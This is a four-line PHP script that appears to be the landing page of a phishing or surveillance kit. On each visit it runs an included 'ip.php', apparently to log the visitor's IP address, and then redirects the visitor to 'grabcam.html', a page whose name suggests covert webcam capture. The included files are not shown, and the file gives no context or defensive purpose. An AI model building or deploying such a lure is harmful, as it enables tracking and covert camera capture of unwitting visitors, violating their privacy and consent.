<?php
include 'ip.php';
header('Location: grabcam.html');
exit
?>
